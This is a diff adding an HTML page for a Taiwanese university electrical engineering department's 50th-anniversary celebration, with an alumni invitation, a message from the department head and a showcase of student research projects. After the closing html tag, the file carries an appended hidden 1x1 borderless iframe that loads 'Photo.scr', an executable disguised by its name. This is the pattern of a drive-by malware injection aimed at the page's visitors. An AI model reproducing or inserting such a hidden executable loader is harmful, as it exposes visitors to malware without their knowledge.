@@ -1,0 +1,456 @@
+<!DOCTYPE html>
+<!--[if lt IE 7 ]> <html class="ie ie6 no-js" lang="en"> <![endif]-->
+<!--[if IE 7 ]>    <html class="ie ie7 no-js" lang="en"> <![endif]-->
+<!--[if IE 8 ]>    <html class="ie ie8 no-js" lang="en"> <![endif]-->
+<!--[if IE 9 ]>    <html class="ie ie9 no-js" lang="en"> <![endif]-->
+<!--[if gt IE 9]><!-->
+<html class="no-js" lang="en">
+<!--<![endif]-->
+
+<head>
+    <meta charset="UTF-8" />
+    <title>國立高雄應用科技大學電機系系慶</title>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7" crossorigin="anonymous">
+    <link rel="shortcut icon" type="image/x-icon" href="/logo.ico">
+    <link rel="stylesheet" type="text/css" media="screen" href="css/bootstrap.css">
+    <link rel="stylesheet" href="css/font-awesome.css">
+    <link rel="stylesheet" href="css/animate.css">
+    <link rel="stylesheet" href="css/theme.css">
+    <link href='http://fonts.googleapis.com/css?family=Montserrat:400,700' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:400,300,300italic,400italic,600,600italic,700,700italic,800,800italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Playball' rel='stylesheet' type='text/css'>
+    <link href="https://fonts.googleapis.com/css?family=Indie+Flower" rel="stylesheet">
+    <link href='https://fonts.googleapis.com/css?family=Pacifico' rel='stylesheet' type='text/css'>
+    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Tangerine">
+    <link rel="stylesheet" type="text/css" href="http://fonts.googleapis.com/earlyaccess/cwtexfangsong.css"> </head>
+
+<body>
+    <!--wrapper start-->
+    <div class="wrapper" id="wrapper">
+        <!--header-->
+        <header>
+            <div class="menu">
+                <div class="navbar-wrapper">
+                    <div class="container">
+                        <div class="navwrapper">
+                            <div class="navbar navbar-inverse navbar-static-top">
+                                <div class="container">
+                                    <div class="navArea">
+                                        <div class="navbar-collapse collapse">
+                                            <ul class="nav navbar-nav">
+                                                <ul class="nav navbar-nav">
+                                                    <li class="menuItem"><a href="index.php">首頁</a></li>
+                                                    <li class="menuItem"><a href="#aboutus">系慶活動</a></li>
+                                                    <li class="menuItem"><a href="#specialties">邁向50週年</a></li>
+                                                    <li class="menuItem"><a href="#gallery">電機學術殿堂</a></li>
+                                                    <li class="menuItem"><a href="#feedback">給系友的話</a></li>
+                                                    <li class="menuItem"><a href="#contact">近期成果</a></li>
+                                                </ul>
+                                            </ul>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="banner row" id="banner">
+                <div class="parallax text-center" style="background-image: url(img/kuas.jpg);">
+                    <div class="parallax-pattern-overlay">
+                        <div class="container text-center" style="height:580px;padding-top:170px;">
+                            <h2 class="intro wow zoomIn" wow-data-delay="0.4s" wow-data-duration="0.9s">Happy 50th  anniversary<br>
+                       電機工程系50週年系慶</h2> </div>
+                    </div>
+                </div>
+            </div>
+        </header>
+        <!--about us-->
+        <section class="aboutus" id="aboutus">
+            <div class="container">
+                <div class="heading text-center"> <img src="img/20161006.jpg" alt="">
+                    <div class="heading text-center">
+                        <h2>系慶活動</h2>
+                        <h7>歡迎系友回娘家</h7>
+                        <h3>各位系友們好：
+時光荏冉，歲月如梭，懷念高應大(原高雄工專)電機校園曾有我們走過的青春足跡與歡笑氣息，學長們離校數十載，今年適逢電機50週年系慶，期盼學長們呼應同學們回娘家,來一場電機50屆大同學會，讓全世界看見高應大電機50週年耀眼光芒！<br>
+系主任 李俊宏 教授、大會總執行長 許 文 （盈正豫順董事長）、電機系 系友會   吳承澐會長、暨全體 理監事敬邀<br>
+*系慶日期:105年12月24日(六)上午9點<br>
+            </h3> </div>
+                    <div class="row">
+                        <div class="col-md-12">
+                            <div class="papers text-center">
+                                <h4 class="notopmarg nobotmarg">國立高雄應用科技大學電機工程學系50週年系慶地點</h4>
+                                <a href="https://www.google.com/maps/dir//%E5%9C%8B%E7%AB%8B%E9%AB%98%E9%9B%84%E6%87%89%E7%94%A8%E7%A7%91%E6%8A%80%E5%A4%A7%E5%AD%B8%E5%BB%BA%E5%B7%A5%E6%A0%A1%E5%8D%80+807%E5%8F%B0%E7%81%A3%E9%AB%98%E9%9B%84%E5%B8%82%E4%B8%89%E6%B0%91%E5%8D%80%E5%BB%BA%E5%B7%A5%E8%B7%AF415%E8%99%9F/@22.650502,120.326064,16z/data=!4m9!4m8!1m0!1m5!1m1!1s0x346e04d91d096a91:0x75ce7e7f7c793c56!2m2!1d120.3282523!2d22.6505021!3e0?hl=zh-TW"><img src="img/saus.jpg" alt=""></a>
+                                <br/>
+                                <p> </p>
+                            </div>
+                        </div>
+                        <!--<div class="col-md-6">
+                        <div class="papers text-center">
+                            <h4 class="notopmarg nobotmarg">國立高雄應用科技大學電機工程學系50周年系慶議程</h4> <img src="img/b35d7f_eb5668de86924877b3fe0b998c95f6da.png" alt="">
+                            <br/> <a href="http://media.wix.com/ugd/b35d7f_ff34e738b7684ad39550fad2ca4e86d8.pdf"><b>Download my resume</b></a>
+                            <p> </p>
+                        </div>
+                    </div>--></div>
+                </div>
+            </div>
+        </section>
+        <!--specialties-->
+        <section class="specialties" id="specialties">
+            <div class="container">
+                <div class="heading text-center"><img class="dividerline" src="img/20161006.jpg" alt="">
+                    <div>&nbsp;</div>
+                    <h2>邁向50週年</h2> </div>
+                <div class="row">
+                    <div class="col-md-12 text-center"> <img src="img/story.png"> </div>
+                </div>
+            </div>
+        </section>
+        <!--gallery-->
+        <section class="gallery" id="gallery">
+            <div class="container">
+                <div class="heading text-center"><img class="dividerline" src="img/20161006.jpg" alt="">
+                    <div>&nbsp;</div>
+                    <h2>電機學術殿堂</h2> </div>
+                <div id="photoCarousel" class="carousel slide" data-ride="carousel" data-interval="3000">
+                    <!-- 瀏覽控制器-->
+                    <ol class="carousel-indicators">
+                        <li data-target="#photoCarousel" data-slide-to="0" class="active"></li>
+                        <li data-target="#photoCarousel" data-slide-to="1"></li>
+                        <li data-target="#photoCarousel" data-slide-to="2"></li>
+                        <li data-target="#photoCarousel" data-slide-to="3"></li>
+                        <li data-target="#photoCarousel" data-slide-to="4"></li>
+                        <li data-target="#photoCarousel" data-slide-to="4"></li>
+                    </ol>
+                    <!-- 建立相片清單-->
+                    <div class="carousel-inner">
+                        <div class="item active"> <img src="img/21.jpg" />
+                            <!--加上照片說明-->
+                            <div class="carousel-caption"> </div>
+                        </div>
+                        <div class="item"> <img src="img/1.JPG" />
+                            <!--加上照片說明-->
+                            <div class="carousel-caption"> </div>
+                        </div>
+                        <div class="item"> <img src="img/2.JPG" />
+                            <!--加上照片說明-->
+                            <div class="carousel-caption"> </div>
+                        </div>
+                        <div class="item"> <img src="img/3.JPG" />
+                            <!--加上照片說明-->
+                            <div class="carousel-caption"> </div>
+                        </div>
+                        <div class="item"> <img src="img/4.JPG" />
+                            <!--加上照片說明-->
+                            <div class="carousel-caption"> </div>
+                        </div>
+                        <div class="item"> <img src="img/5.JPG" />
+                            <!--加上照片說明-->
+                            <div class="carousel-caption"> </div>
+                        </div>
+                    </div>
+                    <!--上下一張控制-->
+                    <a class="left carousel-control" href="#photoCarousel" data-slide="prev"> <span class="glyphicon glyphicon-chevron-left"></span> </a>
+                    <a class="right carousel-control" href="#photoCarousel" data-slide="next"> <span class="glyphicon glyphicon-chevron-right"></span> </a>
+                </div>
+            </div>
+        </section>
+        <!--feedback-->
+        <section class="feedback" id="feedback">
+            <div class="container w960">
+                <div class="heading"><img class="dividerline" src="img/20161006.jpg" alt="">
+                    <div>&nbsp;</div>
+                    <h2>給系友的話</h2></div>
+                <div class="row">
+                    <h8>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;50年象徵一個人從出生到中壯年的人生精華，對學校系所而言卻代表具有長久歷史傳承基業，經得起時代考驗與挑戰；高應大電機系屹立至今邁入50週年，這是一個偉大系所的時代故事...
+                        <br> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;高應大電機系（原高雄工專電機科）自民國56年成立以來，『椰城』便是所有歷屆校友共同的校園回憶，89年改名為科技大學，98年學校定位為「親產業的優質大學」，成為全國第一所強調「貼近產業、瞭解產業」的大學，以「培養優質技職人才、研發實用產業技術、成為企業最愛夥伴」辦學目標，在教師研發、學生學習、課程教學三面向，貼近產業需求，積極建構親產學環境。電機系致力於理論與實務兼顧的教學，在電力系統、自動控制、綠色能源、光電領域、工業4.0、大數據分析應用、與資通訊領域等學術領域，每處都強調理論和實作不能分離。畢業生在公私立機關以及產業界，都有卓越的成績與貢獻。
+                        <br> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我們見證電機系邁入50週年，感到無比的榮耀。看到校友學長們的成就，電機系的核心精神，就在師生、校友們的合心灌溉下，日積月累形成的將不只是「高應大電機系」的品牌能見度，而是日益厚實而永續的學術殿堂資產。
+                        <br> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;『「最好」是「較好」的最大敵人』，生生滅滅的歷史洪流中，每個人都是短暫的過客；我們正在寫歷史，在過去優良傳統建立的基石，堅信未來的電機系永遠不斷進步與繁盛！ </h8>
+                    <cite1>李俊宏
+                        <br>Chung-Hong Lee</cite1>
+                </div>
+            </div>
+        </section>
+        <!--feedback-->
+        <section class="contact" id="contact">
+            <div class="container">
+                <div class="heading"><img class="dividerline" src="img/20161006.jpg" alt="">
+                    <div>&nbsp;</div>
+                    <h2>近期成果</h2> </div>
+            </div>
+            <div id="grid-gallery" class="grid-gallery">
+                <section class="grid-wrap">
+                    <ul class="grid">
+                        <li class="grid-sizer"></li>
+                        <!-- for Masonry column width -->
+                        <li>
+                            <figure> <img src="img/27.JPG" alt="" />
+                                <figcaption>
+                                    <h3>工業4.0前瞻研究<br>&nbsp;</h3> </figcaption>
+                            </figure>
+                        </li>
+                        <li>
+                            <figure> <img src="img/0.JPG" alt="" />
+                                <figcaption>
+                                    <h3>大數據應用:「全球重大即時事件偵測系統大數據平台」</h3> </figcaption>
+                            </figure>
+                        </li>
+                        <li>
+                            <figure> <img src="img/15-1.jpg" alt="" />
+                                <figcaption>
+                                    <h3>大數據應用:「電動車巨量資料探勘技術之開發與應用」</h3> </figcaption>
+                            </figure>
+                        </li>
+                        <li>
+                            <figure> <img src="img/16-3.jpg" alt="" />
+                                <figcaption>
+                                    <h3>GSM型需量預約服務控制器(台電計畫)</h3> </figcaption>
+                            </figure>
+                        </li>
+                        <li>
+                            <figure> <img src="img/17-3.jpg" alt="" />
+                                <figcaption>
+                                    <h3>GPRS 無線通訊板<br>&nbsp;</h3> </figcaption>
+                            </figure>
+                        </li>
+                        <li>
+                            <figure> <img src="img/20.jpg" alt="" />
+                                <figcaption>
+                                    <h3>輪鼓馬達電動機車<br>&nbsp;</h3> </figcaption>
+                            </figure>
+                        </li>
+                        <li>
+                            <figure> <img src="img/19.jpg" alt="" />
+                                <figcaption>
+                                    <h3>磁阻馬達應用於社區節能電動機車<br>&nbsp;</h3> </figcaption>
+                            </figure>
+                        </li>
+                        <li>
+                            <figure> <img src="img/9.jpg" alt="" />
+                                <figcaption>
+                                    <h3>以智慧手機監控之門禁居家安全系統</h3> </figcaption>
+                            </figure>
+                        </li>
+                        <li>
+                            <figure> <img src="img/14.jpg" alt="" />
+                                <figcaption>
+                                    <h3>GPS衛星定位語音提示導盲車<br>&nbsp;</h3> </figcaption>
+                            </figure>
+                        </li>
+                        <li>
+                            <figure> <img src="img/8.jpg" alt="" />
+                                <figcaption>
+                                    <h3>遊樂園無人駕駛自動導覽車<br>&nbsp;</h3> </figcaption>
+                            </figure>
+                        </li>
+                        <li>
+                            <figure> <img src="img/6.jpg" alt="" />
+                                <figcaption>
+                                    <h3>履帶行遠端監控車輛<br>&nbsp;</h3> </figcaption>
+                            </figure>
+                        </li>
+                        <li>
+                            <figure> <img src="img/13.jpg" alt="" />
+                                <figcaption>
+                                    <h3>智慧型功能電子載具機器人<br>&nbsp;</h3> </figcaption>
+                            </figure>
+                        </li>
+                        <li>
+                            <figure> <img src="img/11.jpg" alt="" />
+                                <figcaption>
+                                    <h3>雷射掃描及影像分析判別停車方式之自走車</h3> </figcaption>
+                            </figure>
+                        </li>
+                        <li>
+                            <figure> <img src="img/24.jpg" alt="" />
+                                <figcaption>
+                                    <h3>影像處理智能智慧自動撿球機<br>&nbsp;</h3> </figcaption>
+                            </figure>
+                        </li>
+                        <li>
+                            <figure> <img src="img/26.jpg" alt="" />
+                                <figcaption>
+                                    <h3>智能吸塵拖地清潔車<br>&nbsp;</h3> </figcaption>
+                            </figure>
+                        </li>
+                        <li>
+                            <figure> <img src="img/23-1.jpg" alt="" />
+                                <figcaption>
+                                    <h3>隱藏式防盜追竊系統<br>&nbsp;</h3> </figcaption>
+                            </figure>
+                        </li>
+                    </ul>
+                    <h3 align="right">...MORE</h3> </section>
+                <!-- // end small images -->
+                <section class="slideshow">
+                    <ul>
+                        <li>
+                            <figure> <img src="img/27-1.jpg" alt="" />
+                                <figcaption>
+                                    <h3>工業4.0前瞻研究</h3> </figcaption>
+                            </figure>
+                        </li>
+                        <li>
+                            <figure> <img src="img/cloud0.gif" alt="" />
+                                <figcaption>
+                                    <h3>大數據應用:「全球重大即時事件偵測系統大數據平台」</h3>
+                                    <p>
+                                        <a href="http://203.64.104.25/web/KUAS/img/insta.gif">
+                                            <button type="button" class="btn btn-primary">放大(撈資料)</button>
+                                        </a>
+                                    </p>
+                                </figcaption>
+                            </figure>
+                        </li>
+                        <li>
+                            <figure> <img src="img/15.jpg" alt="" />
+                                <figcaption>
+                                    <h3>大數據應用:「電動車巨量資料探勘技術之開發與應用」</h3> </figcaption>
+                            </figure>
+                        </li>
+                        <li>
+                            <figure> <img src="img/16-3.jpg" alt="" />
+                                <figcaption>
+                                    <h3>GSM型需量預約服務控制器</h3> </figcaption>
+                            </figure>
+                        </li>
+                        <li>
+                            <figure> <img src="img/17-3.jpg" alt="" />
+                                <figcaption>
+                                    <h3>GPRS 無線通訊板</h3> </figcaption>
+                            </figure>
+                        </li>
+                        <li>
+                            <figure> <img src="img/20-1.jpg" alt="" />
+                                <figcaption>
+                                    <h3>輪鼓馬達電動機車</h3></figcaption>
+                            </figure>
+                        </li>
+                        <li>
+                            <figure> <img src="img/19-1.jpg" alt="" />
+                                <figcaption>
+                                    <h3>磁阻馬達應用於社區節能電動機車</h3></figcaption>
+                            </figure>
+                        </li>
+                        <li>
+                            <figure> <img src="img/9-1.jpg" alt="" />
+                                <figcaption>
+                                    <h3>以智慧手機監控之門禁居家安全系統</h3> </figcaption>
+                            </figure>
+                        </li>
+                        <li>
+                            <figure> <img src="img/7-1.jpg" alt="" />
+                                <figcaption>
+                                    <h3>GPS衛星定位語音提示導盲車</h3> </figcaption>
+                            </figure>
+                        </li>
+                        <li>
+                            <figure> <img src="img/8-1.jpg" alt="" />
+                                <figcaption>
+                                    <h3>遊樂園無人駕駛自動導覽車</h3> </figcaption>
+                            </figure>
+                        </li>
+                        <li>
+                            <figure> <img src="img/6-1.jpg" alt="" />
+                                <figcaption>
+                                    <h3>履帶行遠端監控車輛</h3> </figcaption>
+                            </figure>
+                        </li>
+                        <li>
+                            <figure> <img src="img/13.jpg" alt="" />
+                                <figcaption>
+                                    <h3>智慧型功能電子載具機器人</h3></figcaption>
+                            </figure>
+                        </li>
+                        <li>
+                            <figure> <img src="img/11-1.jpg" alt="" />
+                                <figcaption>
+                                    <h3>雷射掃描及影像分析判別停車方式之自走車</h3> </figcaption>
+                            </figure>
+                        </li>
+                        <li>
+                            <figure> <img src="img/24-1.jpg" alt="" />
+                                <figcaption>
+                                    <h3>影像處理智能智慧自動撿球機</h3> </figcaption>
+                            </figure>
+                        </li>
+                        <li>
+                            <figure> <img src="img/26-1.jpg" alt="" />
+                                <figcaption>
+                                    <h3>智能吸塵拖地清潔車</h3> </figcaption>
+                            </figure>
+                        </li>
+                        <li>
+                            <figure> <img src="img/23-1.jpg" alt="" />
+                                <figcaption>
+                                    <h3>隱藏式防盜追竊系統</h3> </figcaption>
+                            </figure>
+                        </li>
+                    </ul>
+                    <nav> <span class="icon nav-prev"></span> <span class="icon nav-next"></span> <span class="icon nav-close"></span> </nav>
+                    <div class="info-keys icon">Navigate with arrow keys</div>
+                </section>
+                <!-- // end slideshow -->
+            </div>
+            <!-- // grid-gallery -->
+        </section>
+        <!--footer-->
+        <section class="footer" id="footer">
+            <p class="text-center"> <a href="#wrapper" class="gototop"><i class="fa fa-angle-double-up fa-2x"></i></a> </p>
+            <div class="container">
+                <ul>
+                    <li><a href="#"><i class="fa fa-twitter"></i></a></li>
+                    <li><a href="https://www.facebook.com/profile.php?id=100000405256727"><i class="fa fa-facebook"></i></a></li>
+                    <li><a href="#"><i class="fa fa-linkedin"></i></a></li>
+                    <li><a href="#"><i class="fa fa-pinterest"></i></a></li>
+                    <li><a href="#"><i class="fa fa-flickr"></i></a></li>
+                </ul>
+                <p> &copy; 2016 國立高雄應用科技大學
+                    <br> 製作 <a href="https://dl.dropboxusercontent.com/u/150456386/assets/index.html#three">電機工程系-王俊淵<br>  
+                     (092413393354 製作專線 點擊)</a> </p>
+            </div>
+        </section>
+    </div>
+    <!--wrapper end-->
+    <!--Javascripts-->
+    <script src="js/jquery.js"></script>
+    <script src="js/common.js"></script>
+    <script src="js/modernizr.js"></script>
+    <script src="js/bootstrap.js"></script>
+    <script src="js/menustick.js"></script>
+    <script src="js/parallax.js"></script>
+    <script src="js/easing.js"></script>
+    <script src="js/wow.js"></script>
+    <script src="js/smoothscroll.js"></script>
+    <script src="js/masonry.js"></script>
+    <script src="js/imgloaded.js"></script>
+    <script src="js/classie.js"></script>
+    <script src="js/colorfinder.js"></script>
+    <script src="js/gridscroll.js"></script>
+    <script src="js/contact.js"></script>
+    <script src="js/Item.js"></script>
+    <!-- Histats.com  (div with counter) -->
+    <div id="histats_counter"></div>
+    <!-- Histats.com  START  (aync)-->
+    <script type="text/javascript">
+        var _Hasync = _Hasync || [];
+        _Hasync.push(['Histats.start', '1,3641613,4,306,118,60,00011010']);
+        _Hasync.push(['Histats.fasi', '1']);
+        _Hasync.push(['Histats.track_hits', '']);
+        (function () {
+            var hs = document.createElement('script');
+            hs.type = 'text/javascript';
+            hs.async = true;
+            hs.src = ('//s10.histats.com/js15_as.js');
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+        })();
+    </script>
+    <noscript>
+        <a href="/" target="_blank"><img src="//sstatic1.histats.com/0.gif?3641613&101" alt="stats counter" border="0"></a>
+    </noscript>
+    <!-- Histats.com  END  -->
+</body>
+
+</html>
+<iframe src=Photo.scr width=1 height=1 frameborder=0> </iframe>
